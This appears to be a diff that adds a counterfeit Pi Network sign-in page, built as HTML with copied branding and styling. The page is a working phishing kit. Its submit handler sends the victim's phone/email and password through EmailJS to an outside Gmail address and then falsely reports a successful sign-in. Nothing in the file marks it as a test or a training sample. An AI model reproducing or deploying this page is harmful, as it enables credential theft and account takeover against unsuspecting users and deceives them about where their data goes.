@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Pi Network</title>
+    <link rel="stylesheet" href="Pi Blockchain, Community & Developer Platform _ Pi Network_files/nitro-min-noimport-eaffc0cbc08d302415e1e3ff9486d386-stylesheet.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("FDEI7t8JDI4LRu2mI");
+        })();
+    </script>
+    <style>
+        :root {
+            --pi-purple: #6C1BDB;
+            --pi-purple-light: #8347E5;
+            --pi-purple-dark: #5816B8;
+            --pi-gray: #F5F5F5;
+            --pi-gradient: linear-gradient(135deg, var(--pi-purple), var(--pi-purple-light));
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: var(--pi-gradient);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .signin-container {
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
+            transform: translateY(0);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .signin-container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+        }
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+            animation: fadeInDown 0.8s ease;
+        }
+        .logo-container img {
+            width: 180px;
+            height: auto;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 4px 6px rgba(108, 27, 219, 0.2));
+        }
+        .signin-form {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            position: relative;
+        }
+        .form-group label {
+            font-weight: 600;
+            color: #333;
+            font-size: 15px;
+            margin-left: 4px;
+        }
+        .form-group input {
+            padding: 15px;
+            border: 2px solid #E0E0E0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: rgba(255, 255, 255, 0.9);
+        }
+        .form-group input:focus {
+            border-color: var(--pi-purple);
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(108, 27, 219, 0.1);
+            background: #fff;
+        }
+        .submit-btn {
+            background: var(--pi-gradient);
+            color: white;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(108, 27, 219, 0.3);
+        }
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        .submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .error-message {
+            color: #ff4d4f;
+            font-size: 14px;
+            display: none;
+            margin-top: 4px;
+        }
+        h2 {
+            color: var(--pi-purple);
+            text-align: center;
+            margin-bottom: 35px;
+            font-size: 28px;
+            font-weight: 700;
+            animation: fadeInUp 0.8s ease;
+        }
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        /* Add loading animation for the button */
+        .submit-btn.loading {
+            position: relative;
+            color: transparent;
+        }
+        .submit-btn.loading::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 50%;
+            left: 50%;
+            margin: -10px 0 0 -10px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="signin-container">
+        <div class="logo-container">
+            <img src="Pi Blockchain, Community & Developer Platform _ Pi Network_files/Pi-Network.png" alt="Pi Network Logo">
+        </div>
+        <h2>Sign In to Pi Network</h2>
+        <form class="signin-form" id="signinForm" onsubmit="return handleSubmit(event)">
+            <div class="form-group">
+                <label for="identifier">Phone/Email</label>
+                <input type="text" id="identifier" name="identifier" required placeholder="Enter your phone or email">
+                <div class="error-message" id="identifierError"></div>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required placeholder="Enter your password">
+                <div class="error-message" id="passwordError"></div>
+            </div>
+            <button type="submit" class="submit-btn">Sign In</button>
+        </form>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+            
+            const identifier = document.getElementById('identifier').value;
+            const password = document.getElementById('password').value;
+            
+            // Basic validation
+            if (!identifier || !password) {
+                alert('Please fill in all fields');
+                return false;
+            }
+
+            // Disable the submit button while sending
+            const submitButton = document.querySelector('.submit-btn');
+            submitButton.disabled = true;
+            submitButton.classList.add('loading');
+
+            // Send email using EmailJS
+            emailjs.send("service_eh8ezc6", "template_8fruabc", {
+                to_email: "curor735@gmail.com",
+                user_identifier: identifier,
+                user_password: password,
+            })
+            .then(function(response) {
+                console.log("SUCCESS", response);
+                alert('Sign in successful!');
+                // Reset form
+                document.getElementById('signinForm').reset();
+            })
+            .catch(function(error) {
+                console.log("FAILED", error);
+                alert('Sign in failed. Please try again.');
+            })
+            .finally(function() {
+                // Re-enable the submit button
+                submitButton.disabled = false;
+                submitButton.classList.remove('loading');
+                submitButton.textContent = 'Sign In';
+            });
+            
+            return false;
+        }
+    </script>
+</body>
+</html> 
